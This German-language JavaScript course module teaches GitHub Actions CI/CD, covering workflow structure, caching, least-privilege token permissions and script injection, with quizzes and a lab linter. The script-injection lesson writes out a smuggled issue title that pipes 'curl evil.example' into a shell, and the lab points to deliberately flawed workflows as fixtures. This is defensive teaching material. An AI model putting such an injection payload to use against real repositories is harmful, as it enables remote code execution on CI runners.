// CI/CD mit GitHub Actions · Aufbau, Tempo, Rechte, Eingaben, Lieferkette und Releases. Stichtag 15.11.2026.
// Eigene Texte; Code und Beispiel-Workflows liegen unter content/examples/ci-lab/ (Node.js, ohne Abhängigkeiten).
// Die Ausgaben der Lektionen stammen aus echten Läufen der Lab-CLI (node content/examples/ci-lab/src/cli.js) und der Lab-Tests.
import fs from 'node:fs';
import { execFileSync } from 'node:child_process';

const lab = 'content/examples/ci-lab/';
const nodeVersion = process.version;

function runCli(...names) {
  const paths = names.map((name) => (name.startsWith('.') ? name : `workflows/${name}`));
  let stdout;
  try { stdout = execFileSync('node', ['src/cli.js', ...paths], { cwd: lab, encoding: 'utf8' }); } catch (error) {
    if (error.status !== 1) throw error; // Exit-Code 1 bedeutet „Befunde mit Stufe Fehler“, alles andere ist ein Defekt des Labs
    stdout = error.stdout;
  }
  return `Node.js ${nodeVersion}; Befehl: cd ${lab} && node src/cli.js ${paths.join(' ')}\n${stdout.trimEnd()}`;
}

function specOutput() {
  let text;
  try { text = execFileSync('node', ['--test', '--test-reporter=spec', 'tests/lint.test.js'], { cwd: lab, encoding: 'utf8' }); } catch (error) { throw new Error(`Lab-Tests schlagen fehl:\n${error.stdout}`); }
  const kept = text.split('\n').filter((line) => /^\s*(✔|ℹ (tests|pass|fail))/.test(line)).map((line) => line.replace(/\s*\(\d[\d.]*ms\)\s*$/, '').trimEnd());
  return `Node.js ${nodeVersion}; Befehl: cd ${lab} && npm test\n${kept.join('\n')}`;
}

const gh = (title, url, note = 'Offizielle Dokumentation von GitHub; Inhalt hier eigenständig zusammengefasst.') => ({ title: `GitHub-Dokumentation: ${title}`, url, note });

export const module = {
  id: 'ci-m1', course: 'cicd', part: 33, partTitle: 'CI/CD mit GitHub Actions',
  title: 'CI/CD mit GitHub Actions · Aufbau, Tempo, Rechte, Eingaben, Lieferkette und Releases',
};

const prerequisites = 'Grundkenntnisse in Git und der Kommandozeile (Modul „Git“ bzw. „Linux & Shell“) und ein Projekt mit Tests, zum Beispiel aus dem Modul „Node.js“.';
const verification = (what, notTested) => `Geprüft wurde mit dem CI-Lab (Node.js ${nodeVersion}, Workflow-Linter ohne Abhängigkeiten, 15 Tests): ${what} Jede Ausgabe stammt aus einem echten Lauf der Lab-CLI. Nicht geprüft: ${notTested} Der Linter ist eine zeilenbasierte Heuristik und ersetzt weder einen YAML-Parser noch Werkzeuge wie actionlint oder zizmor.`;

export const lessons = [
  {
    id: 'ci-m1-l1', title: 'Workflow-Aufbau: Ereignisse, Jobs, Schritte und Runner', minutes: 30,
    prerequisites,
    objectives: [
      'Ereignis (on), Job, Schritt (step) und Runner voneinander unterscheiden',
      'Erklären, warum Jobs parallel und auf frischen Maschinen laufen und wie needs eine Reihenfolge erzeugt',
      'Einen einfachen Workflow lesen: Auslöser, Rechte, Aufgaben, Schritte',
      'Einen Workflow mit der Lab-CLI auf typische Fehler prüfen',
    ],
    simple: `GitHub Actions führt Workflows aus. Ein Workflow ist eine YAML-Datei unter .github/workflows. Er beginnt mit einem Ereignis (on): zum Beispiel ein Push auf main, ein Pull Request, ein Zeitplan oder ein manueller Start. Wenn das Ereignis eintritt, startet GitHub den Workflow.

Ein Workflow besteht aus Jobs. Jeder Job läuft auf einem eigenen Runner, bei GitHub-gehosteten Runnern auf einer frischen virtuellen Maschine, die nach dem Job verschwindet. Jobs laufen standardmäßig parallel; mit needs wartet ein Job auf einen anderen. Dateien eines Jobs sind für andere Jobs nicht sichtbar, es sei denn, du gibst sie über Artefakte weiter.

Ein Job besteht aus Schritten, die nacheinander im selben Arbeitsordner laufen. Ein Schritt ist entweder ein Befehl (run) oder eine fertige Action (uses), zum Beispiel actions/checkout, die den Quelltext holt. Schlägt ein Schritt fehl, bricht der Job ab, und der Lauf gilt als rot.`,
    steps: [
      'Öffne .github/workflows/ci.yml dieses Repositories. Der Block on legt fest, wann der Workflow läuft: bei Pushes auf main und bei jedem Pull Request.',
      'Der Block permissions (Lektion 3) und der Block concurrency (Lektion 2) stehen auf oberster Ebene. Darunter folgt jobs mit einem einzigen Job check.',
      'Der Job hat runs-on: ubuntu-latest (der Runner), ein Zeitlimit (timeout-minutes) und eine Liste von Schritten. Der erste Schritt holt den Quelltext, denn der Runner startet leer.',
      'Vergleiche mit workflows/good-ci.yml im Lab: Dieser Workflow hat zusätzlich eine Matrix, die denselben Job für zwei Node-Versionen startet.',
      'Starte im Ordner content/examples/ci-lab den Befehl „node src/cli.js workflows/good-ci.yml ../../../.github/workflows“. Beide Dateien sollten ohne Befunde durchlaufen.',
      'Prüfe nun die Beispiele mit Mängeln: „node src/cli.js workflows“. Jede Datei bad-*.yml enthält absichtlich genau ein Problem; die Ausgabe nennt Datei, Zeile, Stufe (error/warn), Regel und Begründung.',
      'Merke: Dieser Linter schaut nur auf typische Muster. Er ist eine Ergänzung zu Tests, ersetzt aber nicht das Lesen der offiziellen Dokumentation und keine Werkzeuge wie actionlint.',
    ],
    background: `Wozu die frische Maschine? Sie macht Läufe reproduzierbar: Nichts bleibt vom vorigen Lauf übrig, und ein Fehler hängt nicht von Zufallsresten auf dem Runner ab. Der Preis ist, dass jeder Job Abhängigkeiten neu installieren muss; dafür gibt es Caches (Lektion 2).

Welche Ereignisse sind wichtig? push und pull_request sind der Normalfall für Tests. workflow_dispatch startet manuell, schedule nach Zeitplan (Cron). pull_request_target und workflow_run sind Sonderfälle mit mehr Rechten und deshalb heikel (Lektion 5). Welche Ereignisse welchen Code ausführen, regelt die Dokumentation zu den Auslösern.

Zum Stand: Versionsnummern von Actions (hier checkout@v7 und setup-node@v7) und der Name ubuntu-latest ändern sich im Lauf der Zeit; GitHub verschiebt latest auf neuere Images. Prüfe vor dem Übernehmen in dein Projekt die aktuellen Versionen im jeweiligen Repository der Action.`,
    terms: [
      { term: 'Workflow', text: 'YAML-Datei unter .github/workflows, die Auslöser und Jobs beschreibt.' },
      { term: 'Job', text: 'Gruppe von Schritten, die auf einem Runner läuft; Jobs laufen standardmäßig parallel.' },
      { term: 'Runner', text: 'Maschine, die einen Job ausführt; GitHub-gehostete Runner sind frische virtuelle Maschinen.' },
      { term: 'Action', text: 'Wiederverwendbarer Baustein, der in einem Schritt mit uses eingebunden wird.' },
    ],
    code: { file: '.github/workflows/ci.yml', lang: 'YAML', from: 'on:', to: 'cancel-in-progress: true' },
    code2: { file: lab + 'workflows/good-ci.yml', lang: 'YAML', from: 'jobs:', to: '- run: npm test' },
    code3: { file: lab + 'src/cli.js', lang: 'JavaScript', from: 'let errors = 0;', to: 'process.exit(errors ? 1 : 0);' },
    order: ['body', 'code', 'code2', 'code3', 'body2'],
    output: runCli('good-ci.yml', '../../../.github/workflows'),
    mistakes: [
      { wrong: 'Zu erwarten, dass Dateien eines Jobs im nächsten Job vorhanden sind.', why: 'Jeder Job läuft auf einer eigenen, frischen Maschine.', fix: 'Ergebnisse als Artefakt hochladen und im nächsten Job herunterladen oder beides in einem Job erledigen.' },
      { wrong: 'Den Quelltext nicht auszuchecken.', why: 'Der Runner startet leer; ohne actions/checkout gibt es keine Projektdateien.', fix: 'Als ersten Schritt actions/checkout verwenden.' },
      { wrong: 'Alles in einen einzigen riesigen Job zu packen.', why: 'Nichts läuft parallel, und bei einem Fehler ist die Ursache schwer zu finden.', fix: 'Voneinander unabhängige Prüfungen auf Jobs verteilen, wo es die Laufzeit senkt.' },
      { wrong: 'Workflow-Dateien außerhalb von .github/workflows abzulegen.', why: 'GitHub liest nur diesen Ordner; die Datei wird still ignoriert.', fix: 'Dateien dorthin legen; Beispiele und Tests mit Absicht fehlerhafter Workflows gehören woanders hin.' },
    ],
    practice: 'Schreibe für ein eigenes kleines Projekt einen Workflow mit einem Job: Quelltext holen, Abhängigkeiten installieren, Tests ausführen. Prüfe ihn danach mit der Lab-CLI und achte auf Befunde.',
    exercises: [
      { task: 'Füge dem Beispiel good-ci.yml einen zweiten Job lint hinzu, der nur „npm run lint“ ausführt, und lasse test mit needs auf ihn warten.', acceptance: 'Die CLI meldet keine Befunde; du erklärst, welcher Job zuerst läuft und warum der zweite Job den Quelltext selbst erneut auschecken muss.' },
      { task: 'Grenzfall: Ändere on so, dass der Workflow nur bei Pull Requests läuft, die Dateien unter src/ berühren (paths).', acceptance: 'Du beschreibst, dass ein Pull Request ohne Änderung unter src/ den Workflow nicht startet, und was das für Pflichtprüfungen (required checks) bedeuten kann.' },
      { task: 'Fehlerfall: Entferne aus good-ci.yml den Block permissions und lasse den Linter laufen.', acceptance: 'Die CLI meldet eine Warnung missing-permissions; du stellst den Block wieder her und erklärst die Warnung.' },
    ],
    quiz: [
      { q: 'Wie laufen die Jobs eines Workflows standardmäßig ab?',
        options: ['Parallel, jeder auf einem eigenen Runner.', 'Nacheinander in der Reihenfolge der Datei.', 'Alle auf demselben Runner im selben Ordner.', 'Nur einer, die anderen werden übersprungen.'],
        correct: 0,
        rationales: ['Mit needs lässt sich eine Reihenfolge festlegen.', 'Ohne needs gibt es keine feste Reihenfolge.', 'Jeder Job bekommt eine frische Maschine.', 'Alle Jobs laufen, sofern keine Bedingung sie ausschließt.'],
        explain: 'Parallelität spart Zeit; Abhängigkeiten zwischen Jobs legst du mit needs fest.' },
      { q: 'Wozu dient der Schritt actions/checkout?',
        options: ['Er installiert Node.js auf dem Runner.', 'Er lädt den Quelltext des Repositories auf den Runner.', 'Er prüft die Rechte des Benutzers.', 'Er veröffentlicht das Ergebnis des Jobs.'],
        correct: 1,
        rationales: ['Das erledigt setup-node.', 'Der Runner startet leer und braucht die Dateien.', 'Rechte werden über permissions gesteuert.', 'Veröffentlichen ist ein eigener Schritt.'],
        explain: 'Ohne Checkout fehlt der Projektinhalt, und Befehle wie npm ci scheitern.' },
      { q: 'Warum ist eine Datei .github/workflows/test.yaml.txt kein funktionierender Workflow?',
        options: ['Dateien mit Text im Namen sind zu groß.', 'GitHub liest nur Dateien mit der Endung .yml oder .yaml in diesem Ordner.', 'Der Ordnername muss groß geschrieben sein.', 'Workflows dürfen nur im Ordner src liegen.'],
        correct: 1,
        rationales: ['Die Größe ist nicht der Grund.', 'Die Endung und der Ordner entscheiden, ob GitHub die Datei als Workflow liest.', 'Der Ordner heißt klein .github/workflows.', 'Der Ordner liegt im Wurzelverzeichnis des Repositories.'],
        explain: 'Mit falscher Endung oder am falschen Ort wird die Datei einfach ignoriert, ohne Fehlermeldung.' },
    ],
    sources: [
      gh('Workflow-Syntax', 'https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax'),
      gh('Ereignisse, die Workflows auslösen', 'https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows'),
    ],
    verification: verification('die Lab-CLI auf dem guten Beispiel und auf dem echten Workflow dieses Repositories (beide ohne Befunde).', 'das tatsächliche Ausführen der Workflows bei GitHub (die Lektion prüft den Text, nicht den Lauf).'),
  },
  {
    id: 'ci-m1-l2', title: 'Schneller und stabiler: Cache, Matrix, Concurrency und Zeitlimits', minutes: 30,
    prerequisites,
    objectives: [
      'Den Abhängigkeits-Cache von setup-node einsetzen und seine Grenzen nennen',
      'Mit einer Matrix mehrere Versionen prüfen und fail-fast bewusst wählen',
      'Mit concurrency überholte Läufe abbrechen, ohne Deployments zu gefährden',
      'Zeitlimits (timeout-minutes) setzen und Testberichte nur bei Fehlern als Artefakt sichern',
    ],
    simple: `Ein langsamer oder wackliger Lauf wird übergangen. Vier Hebel helfen.

Cache: Das Herunterladen von Abhängigkeiten kostet bei jedem Lauf Zeit. Mit cache: npm bei setup-node speichert die Action das Download-Verzeichnis von npm und holt es beim nächsten Lauf zurück. Der Schlüssel hängt vom Inhalt der Sperrdatei (package-lock.json) ab; ändert sie sich, entsteht ein neuer Cache. npm ci läuft trotzdem, aber mit lokalen Dateien.

Matrix: Eine Matrix startet denselben Job für mehrere Werte, zum Beispiel Node 22 und 24. Mit fail-fast: false laufen die anderen weiter, wenn einer scheitert; so siehst du, ob nur eine Version betroffen ist.

Concurrency: Mit einer Gruppe und cancel-in-progress bricht ein neuer Lauf den alten für denselben Branch ab. Das spart Zeit bei schnellen Pushes. Zeitlimit: timeout-minutes beendet hängende Jobs rechtzeitig.`,
    steps: [
      'Öffne workflows/good-ci.yml. Der Block strategy mit matrix und fail-fast: false startet zwei Jobs (Node 22 und 24) parallel.',
      'Der Schritt setup-node verwendet node-version: ${{ matrix.node }} und cache: npm. Das Zwischenspeichern betrifft nur das Download-Verzeichnis, nicht node_modules.',
      'Der Block concurrency mit group: ci-${{ github.ref }} und cancel-in-progress: true sorgt dafür, dass pro Branch nur der neueste Lauf zu Ende läuft.',
      'Öffne workflows/bad-no-timeout.yml und starte „node src/cli.js workflows/bad-no-timeout.yml“. Die CLI warnt: Ohne timeout-minutes gilt für den Job das Standardlimit, laut Dokumentation 360 Minuten.',
      'Schätze für deinen Job die normale Laufzeit und setze das Limit etwa beim Zwei- bis Dreifachen: Es soll hängende Läufe stoppen, aber normale nicht abbrechen.',
      'Der echte Workflow dieses Repositories sichert den Testbericht nur bei einem Fehler (if: failure()) und löscht ihn nach sieben Tagen (retention-days). So entstehen keine unnötigen Dateien.',
      'Beachte die Grenze: Ein Cache beschleunigt, ändert aber nie das Ergebnis. Läuft ein Test nur mit Cache grün, ist er fehlerhaft. Bei Zweifeln hilft ein Lauf ohne Cache.',
    ],
    background: `Wann ist cancel-in-progress gefährlich? Bei Deployments und Releases: Ein abgebrochener Lauf kann einen halb ausgerollten Zustand hinterlassen. Dort setzt man cancel-in-progress: false, damit der laufende Vorgang fertig wird und neue Läufe warten (Lektion 6). Für reine Tests ist das Abbrechen ideal.

Warum nicht node_modules zwischenspeichern? Es ist plattform- und versionsabhängig und kann alte oder beschädigte Stände erhalten, die Fehler verdecken. Das Download-Verzeichnis zu sichern und npm ci frisch auszuführen ist robuster. Der Cache ist außerdem kein Sicherheitsmerkmal: Wer Schreibzugriff auf den Cache eines Branches hat, kann ihn manipulieren; sensible Läufe sollten deshalb keine Caches aus nicht vertrauenswürdigen Pull Requests nutzen.

Zum Stand: Größe und Aufbewahrung von Caches sind begrenzt, und GitHub entfernt Einträge, die länger nicht genutzt wurden. Die Grenzen stehen in der Dokumentation zum Zwischenspeichern von Abhängigkeiten und können sich ändern; verlasse dich nie darauf, dass ein Cache vorhanden ist.`,
    terms: [
      { term: 'Cache', text: 'Zwischenspeicher für Dateien (hier Abhängigkeiten), der Läufe beschleunigt, aber nie notwendig sein darf.' },
      { term: 'Matrix', text: 'Startet einen Job mehrfach mit verschiedenen Werten, zum Beispiel Node-Versionen.' },
      { term: 'concurrency', text: 'Gruppe, in der nur ein Lauf gleichzeitig aktiv sein soll; optional bricht ein neuer Lauf den alten ab.' },
      { term: 'timeout-minutes', text: 'Höchstdauer eines Jobs oder Schritts, danach wird er abgebrochen.' },
    ],
    code: { file: lab + 'workflows/good-ci.yml', lang: 'YAML', from: 'concurrency:', to: '- run: npm test' },
    code2: { file: lab + 'workflows/bad-no-timeout.yml', lang: 'YAML' },
    code3: { file: lab + 'src/lint-workflow.js', lang: 'JavaScript', from: 'for (const job of jobs) {', to: 'return findings.sort' },
    order: ['body', 'code', 'code2', 'code3', 'body2'],
    output: runCli('good-ci.yml', 'bad-no-timeout.yml'),
    mistakes: [
      { wrong: 'Kein Zeitlimit zu setzen.', why: 'Ein hängender Job läuft bis zum Standardlimit von 360 Minuten und verbraucht Laufzeit und Geld.', fix: 'timeout-minutes für jeden Job setzen, passend zur normalen Dauer.' },
      { wrong: 'node_modules zwischenzuspeichern und npm ci wegzulassen.', why: 'Ein alter oder fremder Stand kann Fehler verdecken und ist plattformabhängig.', fix: 'Das Download-Verzeichnis cachen und npm ci immer ausführen.' },
      { wrong: 'cancel-in-progress bei Deployments auf true zu stellen.', why: 'Ein abgebrochener Deploy kann einen halb ausgerollten Zustand hinterlassen.', fix: 'Für Releases cancel-in-progress: false und eine eigene Gruppe verwenden.' },
      { wrong: 'fail-fast bei einer Matrix zu übersehen.', why: 'Mit dem Standard true bricht der erste Fehler die übrigen Läufe ab; du siehst nicht, welche Versionen betroffen sind.', fix: 'Bei Kompatibilitätsmatrizen fail-fast: false setzen.' },
    ],
    practice: 'Ergänze für ein eigenes Projekt Cache, Matrix mit zwei Versionen, concurrency und Zeitlimit. Miss die Dauer von zwei Läufen, mit und ohne Cache, und notiere den Unterschied.',
    exercises: [
      { task: 'Setze in good-ci.yml das timeout-minutes testweise auf 1 und beschreibe, was passiert, wenn der Lauf länger dauert.', acceptance: 'Du erklärst, dass der Job nach dem Limit abgebrochen und als fehlgeschlagen markiert wird, und wählst einen sinnvollen Wert.' },
      { task: 'Grenzfall: Füge der Matrix eine dritte Node-Version hinzu, die experimentell ist, und entscheide, ob ihr Fehler den Lauf rot färben soll (continue-on-error).', acceptance: 'Du nennst Vor- und Nachteil von continue-on-error und dokumentierst deine Wahl.' },
      { task: 'Fehlerfall: Kopiere bad-no-timeout.yml, ergänze in der Kopie ein sinnvolles timeout-minutes und prüfe sie mit der CLI.', acceptance: 'Die CLI meldet für die Kopie keine Befunde mehr; du begründest die gewählte Dauer.' },
    ],
    quiz: [
      { q: 'Was speichert cache: npm bei setup-node?',
        options: ['Das fertig gebaute Projekt.', 'Das Verzeichnis node_modules mit allen Paketen.', 'Das Download-Verzeichnis von npm, abhängig von der Sperrdatei.', 'Die Zugangsdaten für die Registry.'],
        correct: 2,
        rationales: ['Gebaute Ergebnisse sind nicht Teil davon.', 'node_modules wird nicht gesichert; npm ci läuft weiter.', 'Ändert sich package-lock.json, entsteht ein neuer Cache.', 'Zugangsdaten gehören nie in einen Cache.'],
        explain: 'So spart der Lauf das Herunterladen, bleibt aber reproduzierbar, weil npm ci frisch installiert.' },
      { q: 'Wann ist cancel-in-progress: true ungeeignet?',
        options: ['Bei schnellen Testläufen für Pull Requests.', 'Bei Deployments, die nicht halb abgebrochen werden dürfen.', 'Bei Workflows mit einer Matrix.', 'Bei Workflows, die nur lesen.'],
        correct: 1,
        rationales: ['Dort spart es Zeit, weil nur der neueste Stand zählt.', 'Ein abgebrochener Deploy kann einen unfertigen Zustand hinterlassen.', 'Die Matrix hat damit nichts zu tun.', 'Lesende Läufe lassen sich unbedenklich abbrechen.'],
        explain: 'Für Releases setzt man cancel-in-progress: false, damit neue Läufe warten statt den laufenden abzubrechen.' },
      { q: 'Welches Standardlimit gilt laut Dokumentation für einen Job ohne timeout-minutes?',
        options: ['5 Minuten.', '30 Minuten.', '60 Minuten.', '360 Minuten.'],
        correct: 3,
        rationales: ['Das wäre viel zu kurz für normale Builds.', 'Das ist ein Wert aus dem Beispiel dieses Repositories, kein Standard.', 'Der Standard ist höher.', 'Das ist der dokumentierte Standardwert (6 Stunden).'],
        explain: 'Ohne eigenes Limit kann ein hängender Job sehr lange Laufzeit verbrauchen; setze ein passendes timeout-minutes.' },
    ],
    sources: [
      gh('Abhängigkeiten zwischenspeichern', 'https://docs.github.com/en/actions/reference/workflows-and-actions/dependency-caching'),
      gh('Gleichzeitige Läufe steuern (concurrency)', 'https://docs.github.com/en/actions/how-tos/write-workflows/choose-when-workflows-run/control-workflow-concurrency'),
      gh('Workflow-Syntax (timeout-minutes, strategy)', 'https://docs.github.com/en/actions/reference/workflows-and-actions/workflow-syntax'),
    ],
    verification: verification('die Warnung für ein fehlendes Zeitlimit und das gute Beispiel mit Matrix, Cache, concurrency und Zeitlimit; der Standardwert 360 steht in der offiziellen Dokumentation (am 15.11.2026 gelesen).', 'Laufzeiten, Cache-Trefferquoten und das Verhalten von concurrency bei echten GitHub-Läufen.'),
  },
  {
    id: 'ci-m1-l3', title: 'Rechte nach dem Minimalprinzip: GITHUB_TOKEN und permissions', minutes: 30,
    prerequisites,
    objectives: [
      'Erklären, was das GITHUB_TOKEN ist und warum seine Rechte begrenzt werden sollten',
      'permissions auf oberster Ebene und pro Job setzen',
      'Erkennen, dass nicht genannte Rechte auf „keine“ gesetzt werden, sobald du permissions angibst',
      'Fork-Pull-Requests und ihre eingeschränkten Rechte einordnen',
    ],
    simple: `Bei jedem Lauf erzeugt GitHub ein GITHUB_TOKEN. Mit ihm kann der Workflow auf das eigene Repository zugreifen: Code lesen, Issues kommentieren, Pakete veröffentlichen. Das Token gilt nur für diesen Lauf. Wichtig ist, was es darf: Wenn jeder Schritt, auch aus fremden Actions, ein Token mit Schreibrechten sieht, kann ein einziger kompromittierter Schritt Code verändern oder Releases manipulieren.

Mit dem Block permissions legst du die Rechte fest. Das Minimalprinzip lautet: nur das, was der Job braucht. Ein Testjob braucht meist nur contents: read. Sobald du permissions angibst, setzt GitHub alle nicht genannten Rechte auf „keine“. Du erweiterst gezielt pro Job: Ein Job, der Pull Requests kommentiert, bekommt pull-requests: write, die anderen nicht.

Ohne permissions gelten die Standardrechte des Repositories oder der Organisation. Die sind je nach Einstellung großzügig oder eingeschränkt; verlasse dich nicht darauf, sondern schreibe die Rechte ausdrücklich in den Workflow.`,
    steps: [
      'Öffne workflows/bad-permissions.yml: Die Zeile „permissions: write-all“ gibt dem Token alle Schreibrechte, obwohl der Job nur ein Skript ausführt.',
      'Starte „node src/cli.js workflows/bad-permissions.yml workflows/bad-no-permissions.yml“. Die erste Datei erzeugt den Fehler write-all, die zweite die Warnung missing-permissions (kein permissions-Block).',
      'Behebe die erste Datei: Ersetze write-all durch „permissions:“ und darunter „contents: read“. Der Aufräum-Job braucht nur Lesezugriff auf den Code.',
      'Prüfe die zweite Datei: Ergänze auf oberster Ebene permissions: contents: read. Dann stimmt die Voreinstellung für alle Jobs.',
      'Öffne workflows/release.yml: Der Job release erhält permissions: contents: write, weil er später einen Release anlegen könnte; verify bleibt bei Lesezugriff. Rechte pro Job ersetzen die oberste Ebene.',
      'Prüfe die Rechte neuer Aktionen in der Dokumentation: Jede Action nennt, welche permissions sie braucht. Gib nur das frei, was dort steht.',
      'Beachte den Sonderfall: Bei Pull Requests aus Forks erhält das Token nur Leserechte, und Secrets werden nicht übergeben. Das ist gewollt; Workflows, die dort schreiben müssen, gehören in eigene, sorgfältig gesicherte Abläufe (Lektion 5).',
    ],
    background: `Warum ist das so wichtig? In der Lieferkette gilt: Jede Action ist fremder Code, der mit den Rechten des Tokens läuft. Ein enges Token begrenzt den Schaden, wenn eine Action kompromittiert wird. Die Regel „least privilege“ ist deshalb die wirksamste einzelne Einstellung gegen Missbrauch.

Was bedeutet das Standard-Token konkret? Die Dokumentation unterscheidet eine großzügige und eine eingeschränkte Voreinstellung, die für Repository oder Organisation gewählt wird. Neuere Repositories starten eingeschränkt, ältere können noch großzügig sein. Prüfe die Einstellung unter Settings → Actions → General, aber verlasse dich nicht darauf: Der Workflow soll die Rechte selbst nennen, damit er unabhängig von der Einstellung gleich funktioniert und im Review lesbar ist.

Dauerhafte Zugangsdaten (Personal Access Tokens) sind nur der Ausweg, wenn das GITHUB_TOKEN nicht reicht, zum Beispiel für Zugriff auf andere Repositories. Sie sind länger gültig und weiter gefasst, daher heikler als das Token pro Lauf.`,
    terms: [
      { term: 'GITHUB_TOKEN', text: 'Von GitHub pro Lauf erzeugtes Zugangstoken für das eigene Repository; verfällt, wenn der Job endet.' },
      { term: 'permissions', text: 'Workflow- oder Job-Block, der die Rechte des Tokens festlegt; nicht genannte Rechte werden auf „keine“ gesetzt.' },
      { term: 'Minimalprinzip', text: 'Jede Komponente erhält nur die Rechte, die sie für ihre Aufgabe braucht (least privilege).' },
      { term: 'write-all', text: 'Kurzform, die dem Token alle Schreibrechte gibt; fast nie gerechtfertigt.' },
    ],
    code: { file: lab + 'workflows/bad-permissions.yml', lang: 'YAML' },
    code2: { file: lab + 'workflows/release.yml', lang: 'YAML', from: 'permissions:', to: 'environment: production' },
    code3: { file: lab + 'src/lint-workflow.js', lang: 'JavaScript', from: 'const hasTopLevelPermissions', to: 'Setze permissions: contents: read' },
    order: ['body', 'code', 'code2', 'code3', 'body2'],
    output: runCli('bad-permissions.yml', 'bad-no-permissions.yml'),
    mistakes: [
      { wrong: 'permissions: write-all zu setzen, damit „es einfach läuft“.', why: 'Jeder Schritt, auch aus fremden Actions, kann dann schreiben, Releases anlegen oder Code ändern.', fix: 'Nur die benötigten Rechte nennen, zum Beispiel contents: read.' },
      { wrong: 'Auf die Standardrechte des Repositories zu vertrauen.', why: 'Die Einstellung kann großzügig sein und sich ändern; im Workflow ist sie nicht sichtbar.', fix: 'permissions im Workflow ausdrücklich angeben.' },
      { wrong: 'Schreibrechte global zu vergeben, obwohl nur ein Job sie braucht.', why: 'Alle anderen Jobs erhalten sie ebenfalls, ohne sie zu brauchen.', fix: 'Oben Lesezugriff, Schreibrechte nur im betroffenen Job.' },
      { wrong: 'Ein Personal Access Token zu verwenden, wo das GITHUB_TOKEN reicht.', why: 'Es gilt länger, ist breiter gefasst und liegt als Secret vor, das abfließen kann.', fix: 'Zuerst das GITHUB_TOKEN mit passenden permissions probieren.' },
    ],
    practice: 'Prüfe alle Workflows eines eigenen Projekts mit der Lab-CLI. Notiere für jeden Job, welche Rechte er wirklich braucht, und setze nur diese.',
    exercises: [
      { task: 'Ersetze in bad-permissions.yml die Zeile permissions: write-all durch die minimal nötigen Rechte.', acceptance: 'Die CLI meldet keine Befunde für die Datei; du begründest, warum contents: read genügt.' },
      { task: 'Grenzfall: Ein Job soll Pull Requests kommentieren (pull-requests: write), alle anderen nur lesen.', acceptance: 'Du setzt oben contents: read und im Job pull-requests: write; du erklärst, warum contents: read im Job wiederholt werden muss, falls er den Code braucht, weil Rechte pro Job die oberste Ebene ersetzen.' },
      { task: 'Fehlerfall: Entferne in good-ci.yml den Block permissions und starte die CLI.', acceptance: 'Die Warnung missing-permissions erscheint; du stellst den Block wieder her.' },
    ],
    quiz: [
      { q: 'Was passiert mit nicht genannten Rechten, sobald du permissions angibst?',
        options: ['Sie behalten die Standardrechte des Repositories.', 'Sie werden auf „keine“ gesetzt.', 'Sie werden auf Lesezugriff gesetzt.', 'Sie werden auf Schreibzugriff gesetzt.'],
        correct: 1,
        rationales: ['Mit einem permissions-Block gelten die Standards nicht mehr.', 'Nur die ausdrücklich genannten Rechte bleiben erhalten.', 'Es gibt keinen automatischen Lesezugriff auf alles.', 'Das wäre das Gegenteil des Minimalprinzips.'],
        explain: 'Deshalb nennst du jedes benötigte Recht ausdrücklich, auch contents: read.' },
      { q: 'Warum sind enge Rechte für das GITHUB_TOKEN wichtig?',
        options: ['Sie machen den Workflow schneller.', 'Sie sind für Forks vorgeschrieben.', 'Ein kompromittierter Schritt kann dann weniger Schaden anrichten.', 'Sie ersetzen Tests.'],
        correct: 2,
        rationales: ['Die Rechte beeinflussen die Laufzeit nicht.', 'Das gilt für alle Workflows, nicht nur für Forks.', 'Auch fremde Actions laufen mit den Rechten des Tokens.', 'Rechte ersetzen keine Prüfung des Codes.'],
        explain: 'Das Minimalprinzip begrenzt den Schaden, wenn eine Action oder ein Schritt missbraucht wird.' },
      { q: 'Welche Rechte erhält das Token bei einem Pull Request aus einem Fork?',
        options: ['Volle Schreibrechte wie im Hauptrepository.', 'Nur Leserechte, und Secrets werden nicht übergeben.', 'Keine Rechte, auch kein Lesen.', 'Die Rechte des Fork-Besitzers im Hauptrepository.'],
        correct: 1,
        rationales: ['Das wäre ein Sicherheitsrisiko für das Hauptrepository.', 'Das ist die dokumentierte Einschränkung für das Ereignis pull_request.', 'Lesen ist erlaubt.', 'Der Fork-Besitzer hat im Hauptrepository keine Schreibrechte.'],
        explain: 'Die Einschränkung schützt Secrets und Code vor fremden Pull Requests.' },
    ],
    sources: [
      gh('Automatische Token-Authentifizierung (GITHUB_TOKEN)', 'https://docs.github.com/en/actions/how-tos/security-for-github-actions/security-guides/automatic-token-authentication'),
      gh('Sichere Verwendung von Actions', 'https://docs.github.com/en/actions/reference/security/secure-use'),
    ],
    verification: verification('die Fehler und Warnungen für write-all und fehlenden permissions-Block sowie das Release-Beispiel mit Rechten pro Job (ohne Befunde).', 'die tatsächlichen Standardrechte eures Repositories und das Verhalten bei Fork-Pull-Requests bei GitHub.'),
  },
  {
    id: 'ci-m1-l4', title: 'Script-Injection: Eingaben aus Tickets und Branches sind Daten, kein Code', minutes: 35,
    prerequisites,
    objectives: [
      'Erklären, wie ${{ … }} in einem run-Skript zu Befehlsausführung führen kann',
      'Von außen steuerbare Felder (Titel, Branchnamen, Kommentare) erkennen',
      'Den Wert über env übergeben und in der Shell in Anführungszeichen lesen',
      'Die Lab-CLI zur Prüfung nutzen und ihre Grenzen nennen',
    ],
    simple: `Ausdrücke in doppelten geschweiften Klammern (${'$'}{{ … }}) wertet GitHub aus, bevor die Shell läuft, und setzt das Ergebnis als Text in das Skript ein. Steht dort ein Wert, den jemand von außen bestimmt, bestimmt er den Skripttext. Ein Ticket mit dem Titel a"; curl evil.example | sh; echo " wird, direkt eingesetzt, zu drei Befehlen statt zu einem Text.

Von außen steuerbar sind viele Felder: Titel und Text von Issues und Pull Requests, Namen von Branches, Kommentare, Commit-Nachrichten, Namen und E-Mail-Adressen von Autoren. Alle, die einen Beitrag leisten können, kontrollieren diese Werte, bei öffentlichen Repositories also jeder.

Die Regel: Setze solche Werte nie direkt in ein Skript. Übergib sie als Umgebungsvariable (env) und lies sie in der Shell mit Anführungszeichen („$TITLE“). Dann ist der Wert Daten, die die Shell nicht als Code liest.`,
    steps: [
      'Öffne workflows/bad-injection.yml: Der Schritt gibt mit echo den Titel eines neuen Tickets aus und setzt ihn über die Ausdruckssyntax direkt in das Skript ein.',
      'Starte „node src/cli.js workflows/bad-injection.yml“. Die CLI meldet script-injection in der Zeile des echo-Befehls.',
      'Behebe es nach dem Muster aus good-ci.yml: Der Schritt bekommt env mit PR_TITLE (oder TICKET_TITLE), dessen Wert der Ausdruck ist; das Skript liest „$PR_TITLE“ in Anführungszeichen.',
